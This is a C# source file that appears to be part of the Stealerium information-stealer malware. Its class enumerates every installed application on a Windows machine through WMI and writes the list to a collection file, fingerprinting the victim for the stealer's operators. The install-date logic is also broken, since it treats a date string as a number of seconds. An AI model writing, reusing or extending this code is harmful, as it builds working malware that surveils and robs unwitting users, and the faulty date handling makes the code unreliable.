using System;
using System.Collections.Generic;
using System.IO;
using System.Management;
using Stealerium.Helpers;

namespace Stealerium.Target.System
{
    internal sealed class InstalledApps
    {
        // Get installed applications
        public static void WriteAppsList(string sSavePath)
        {
            var apps = new List<App>();

            try
            {
                var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Product");

                foreach (ManagementObject row in searcher.Get())
                {
                    var app = new App
                    {
                        Name = row["Name"]?.ToString(),
                        Version = row["Version"]?.ToString(),
                        InstallDate = GetInstallDate(row["InstallDate"]),
                        IdentifyingNumber = row["IdentifyingNumber"]?.ToString()
                    };

                    apps.Add(app);
                }
            }
            catch (Exception ex)
            {
                Logging.Log("InstalledApps fetch error:\n" + ex.Message);
            }

            // Save the list of apps to the file
            SaveAppsToFile(sSavePath, apps);
        }

        // Parse InstallDate from ManagementObject
        private static string GetInstallDate(object installDateObj)
        {
            if (installDateObj == null) return "Unknown";

            if (int.TryParse(installDateObj.ToString(), out var seconds))
            {
                var time = TimeSpan.FromSeconds(seconds);
                var dateTime = DateTime.Today.Add(time);
                return dateTime.ToString("dd/MM/yyyy HH:mm:ss");
            }

            return "Invalid date";
        }

        // Save the apps to a file
        private static void SaveAppsToFile(string sSavePath, List<App> apps)
        {
            try
            {
                foreach (var app in apps)
                {
                    File.AppendAllText(
                        Path.Combine(sSavePath, "Apps.txt"),
                        $"\nAPP: {app.Name}" +
                        $"\n\tVERSION: {app.Version}" +
                        $"\n\tINSTALL DATE: {app.InstallDate}" +
                        $"\n\tIDENTIFYING NUMBER: {app.IdentifyingNumber}" +
                        "\n\n");
                }
            }
            catch (Exception ex)
            {
                Logging.Log("Error saving apps list to file:\n" + ex.Message);
            }
        }

        // Structure to hold app details
        private struct App
        {
            public string Name { get; set; }
            public string Version { get; set; }
            public string IdentifyingNumber { get; set; }
            public string InstallDate { get; set; }
        }
    }
}
